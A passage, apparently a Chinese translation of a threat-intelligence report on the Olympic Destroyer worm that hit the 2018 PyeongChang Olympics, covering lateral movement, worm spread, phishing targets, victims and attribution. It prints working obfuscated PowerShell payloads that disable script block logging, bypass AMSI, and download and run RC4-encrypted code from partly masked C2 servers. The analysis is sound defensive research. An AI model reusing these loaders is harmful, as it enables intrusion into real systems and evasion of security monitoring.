        ${_}-BxoR${S}[(${s}[${I}]+${S}[${H}])%256]}
    };
     ${Wc}.”hEadeRS”.Add.Invoke(cookie,session=ABWjqj0NiqToVn0TW2FTlHIAApw=);
     ${SER}=https://minibo***[.]cl:443;
     ${T}=/components/com_tags/controllers/default_tags.php;
     ${dATa}=${Wc}.DownloadData.Invoke(${seR}+${T});
     ${IV}=${DATA}[0..3];
     ${dAta}=${DaTA}[4..${dAtA}.length];
     -jOin[ChaR[]](^& ${R} ${DAtA} (${IV}+${K}))^|.IEX  &&SeT   RMN=ecHo InvoKe-expRESsIon  ([ENVirOnMeNt]::gETeNvIroNMENTvarIaBlE(‘svTI’,’procEsS’))  ^| pOWErshEll -NOnint  -wiNdOWSt hiddeN -NoEXiT  -NoprOFilE -ExECuTiONPOLIcy  bYpASs     –  && CMd.exE   /c%Rmn%
OlympicDestroyer受害者环境中发现的PowerShell载荷如下所示：
    If($PSVERsIoNTAbLe.PSVeRsIon.MAJOR -Ge 3){$GPS=[ReF].ASSEmbly.GETTYPE(‘System.Management.Automation.Utils’).”GeTFie`Ld”(‘cachedGroupPolicySettings’,’N’+’onPublic,Static’).GEtVALUe($NulL);
    If($GPS[‘ScriptB’+’lockLogging’]){$GPS[‘ScriptB’+’lockLogging’][‘EnableScriptB’+’lockLogging’]=0;
    $GPS[‘ScriptB’+’lockLogging’][‘EnableScriptBlockInvocationLogging’]=0}ElSE{[ScriptBlOcK].”GeTFiE`Ld”(‘signatures’,’N’+’onPublic,Static’).SETValUE($NUlL,(New-ObJecT CoLLectIOnS.GeNeRIC.HAshSet[stRing]))}[ReF].AssEmbLY.GETTYPe(‘System.Management.Automation.AmsiUtils’)|?{$_}|%{$_.GEtField(‘amsiInitFailed’,’NonPublic,Static’).SEtVALue($nULL,$TRuE)};
    };
    [SYStem.NeT.SerVicePoinTMANAGeR]::EXPeCt100ConTINuE=0;
    $wC=NeW-ObJect SySTem.NEt.WEBClIeNT;
    $u=’Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko’;
    $Wc.HEADErS.Add(‘User-Agent’,$u);
    $wC.ProXY=[SYsTeM.NET.WeBREqUesT]::DEFAUltWebPROXY;
    $wC.PROxY.CredentIAlS = [SYsTem.NEt.CRedeNTialCacHe]::DeFAuLTNeTwoRKCredeNtiAls;
    $Script:Proxy = $wc.Proxy;
    $K=[SysTEM.Text.ENcOding]::ASCII.GETBYTes(’94+K/L3OE?o@qRl>.:FPev7rtNb^|#im’);
    $R=
    {
    $D,$K=$ARgs;
    $S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COuNt])%256;
     $S[$_],$S[$J]=$S[$J],$S[$_]};
     $D|%
      {
       $I=($I+1)%256;
       $H=($H+$S[$I])%256;
       $S[$I],$S[$H]=$S[$H],$S[$I];
       $_-bxor$S[($S[$I]+$S[$H])%256]
      }
    };
    $ser=’http://131.255.*.*:8081′;
    $t=’/admin/get.php’;
    $wc.HeAders.Add(“Cookie”,”session=zt8VX24Knnzen8pNvhPl1xJ2E5s=”);
    $daTA=$WC.DownlOADDATA($ser+$t);
    $iV=$DATa[0..3];
    $datA=$dATa[4..$data.leNgth];
    -joiN[CHAR[]](& $R $dAta ($IV+$K))|IEX
## 四、横向渗透
除了使用网络蠕虫的自我复制功能以外，攻击者在执行破坏性恶意软件之前也会手动执行一些横向渗透操作。我们认为攻击者之所以这么做，是为了寻找更合适的位置来释放蠕虫。恶意软件通过PsExec以及窃取的凭据信息在目标网络内渗透、打开默认的meterpreter端口（TCP
4444端口）、下载并运行后门载荷（meterpreter）。攻击者还会检查网络配置信息，可能是想搜寻连接到多个网络或者其他VPN链路的服务器，以进一步渗透可能与奥运会基础设施有关的邻近网络环境。
在受此次攻击影响的滑雪度假酒店网络中，有一台主机启用了卡巴斯基实验室的系统监视器组件，该组件成功收集到攻击者在横向渗透过程中所遗留的一些蛛丝马迹。根据该主机的监测数据，攻击者进入系统的时间为2018年2月6日。攻击者用到了3种类型的PowerShell
scriptlet，分别为TCP 4444端口启动器（opener）、ipconfig启动器（launcher）以及一个下载器（downloader）。
收到这些监测数据后，我们构建了攻击者的活动时间线以及直方图，可以显示攻击者何时在系统上运行可执行文件，如下图所示：
图5. 攻击者在一天内的活跃情况（按小时分布）
由此我们可以看到，在正常办公时间之外攻击者往往最为活跃（韩国标准时间，UTC+
9），攻击者这么做可能是不想引起太大动静，也有可能这些时间刚好与他们的时区相符。
## 五、蠕虫传播
Olympic
Destroyer是一款网络蠕虫，可以收集用户凭据以及主机名信息。新的数据会附加到现有数据的尾部。我们从不同网络中收集了多个蠕虫样本，利用这些样本重建了蠕虫的传播路径，找出了传播的源头（或者至少定位出最开始涉及到的主机名以及用户列表）。
图6. Olympic Destroyer蠕虫传播路径
我们根据提取出来的凭据列表、主机名以及服务器角色制作了上面这张图（服务器角色由服务器名称来判断）。可以看到至少有3个独立的区域可以传播蠕虫：Atos.net公司、滑雪度假酒店以及`Pyeongchang2018.com`服务器。
在某个时间点，带有凭据信息的恶意软件样本被上传到VirusTotal上，从而被安全研究人员发现。安全研究人员在沙箱环境中运行蠕虫样本，并将新版样本再次上传到VirusTotal上。VT上已经存在多个样本，这些样本包含沙箱主机的凭据信息。尽管如此，这款网络蠕虫的发源地并不是这些节点，而是来自于前面提到的几个区域中的某一环。
## 六、受害者
渔叉式钓鱼邮件的攻击目标是冬奥会官方合作伙伴的网络。攻击者可能通过官方网站找到了这些合作伙伴公司的名称以及域名，收集已知的邮件地址，然后开始使用渔叉式钓鱼邮件轰炸这些目标。
这些攻击文档中，有一份于2017年12月29日从韩国上传至VT，该文档位于某个邮件内（哈希值为`6b728d2966194968d12c56f8e3691855`）。邮件发送方模仿了韩国NCTC（国家反恐中心）的邮件地址，所使用的服务器IP归属地为新加坡。
图7. 伪造的发送方地址
这封邮件看上去会发送给`icehockey[@pyeongchang2018](https://github.com/pyeongchang2018
"@pyeongchang2018")[.]com`，然而，真正的攻击目标非常广泛，如下所示：
攻击者在搜索以这些域名结尾的邮箱地址时似乎采取了广撒网的策略，并没有特别精确。使用诸如`sk.com`或者`kt.com`之类的短域名并不是个好主意，以`sk.com`以及`kt.com`为域名结尾的某些完全不相关的公司同样收到了钓鱼邮件，很多人没有注意到这一点，这些公司的域名如下。
    krovy-sk.com（斯洛伐克的木材公司）
    okc-sk.com（加拿大采矿相关公司）
    bcel-kt.com（老挝的财务公司）
    kuhlekt.com（澳大利亚的软件公司）
    wertprojekt.com（德国的房地产公司）
基于我们发现的所有证据，此次攻击活动似乎成功破坏了如下网络：
1、负责滑雪场自动化设施的软件厂商
2、韩国境内的两家滑雪胜地酒店
3、总部位于法国的IT服务提供商（Atos.net）
4、某些商业相关网络
由于这是一款网络蠕虫，可以借助Windows网络共享进行传播，因此肯定会造成一些损失。澳大利亚的某个受害者组织将释放器（dropper）文件上传到了VT上，我们从中提取出了恶意软件所窃取的凭据，其中涉及到的主机名为ATVIES2BQA。这个字符串乍看之下像是一个随机的字符序列，但我们推测AT代表的是主机的国别代码（奥地利），后面的“VIES”为组织名，随后是用于唯一标识某主机的随机字符。根据OSINT（公开源情报）所提供的信息，奥地利只有一个大型组织与这个名称相匹配：VAT
Information Exchange
System（增值税信息交换系统，整个欧盟都在使用）。VIES是欧盟委员会拥有的搜索引擎。被突破的要么是Atos的一台主机，该主机承担与奥地利VIES通信的任务；要么是奥地利的VIES系统，恶意软件的网络传播行为的确给该系统造成了一些损失。
但根据我们的调查结果，蠕虫攻击主要爆发在韩国冬季度假胜地的一家酒店。酒店并没有往VT网站上传任何样本，这也是攻击情况不明的原因所在。我们猜想韩国境内受攻击影响的其他许多公司也采取了类似的操作，这种情况使我们无法完全窥探被攻击的基础设施的完整规模。
虽然我们无法标出酒店的完整攻击链路，但可以确认的是，位于平昌滑雪场的某家酒店的确遭受到了攻击。这个度假村虽然与奥运会相距很近，但并不是举办比赛的官方园区。然而我们还是可以把它当成奥运会周边基础设施的一部分，它为许多客人提供服务，其中还包括参加奥运比赛的运动健儿。采访业主后，我们发现恶意软件成功禁用了滑雪门以及滑雪升降梯，这些设施由受攻击影响的某台服务器负责维护。我们的分析表明，这次攻击是攻击者精心准备的。攻击者刻意选择了这个滑雪胜地的自动化服务器作为破坏性蠕虫的传播源头。这个服务器可以成为网络环境中的“零号病人（patient-zero）”。攻击者所选择的攻击时间点也非常精准，选在开幕式前几个小时，使蠕虫能尽可能传播到网络深处，对基础设施造成影响，给依赖这些设施的人带来最大程度的不便。事实上，攻击者的目的是让蠕虫攻击事件成为一个新闻热点话题。
## 七、追踪溯源迷雾
思科Talos研究人员在公布的[博客](https://blog.talosintelligence.com/2018/02/olympic-destroyer.html)中指出，Olympic
Destroyer使用了类似于BadRabbit以及NotPetya的技术来重置事件日志并删除备份数据。虽然攻击者为了实现类似的效果采用了相似的技术，但编写的具体代码在语法上存在许多差异。攻击者并没有简单地复制粘贴代码，并且许多安全博客之前已经公开讨论过相关命令行，如果任何人有需要，都可以直接利用之前公开的研究成果。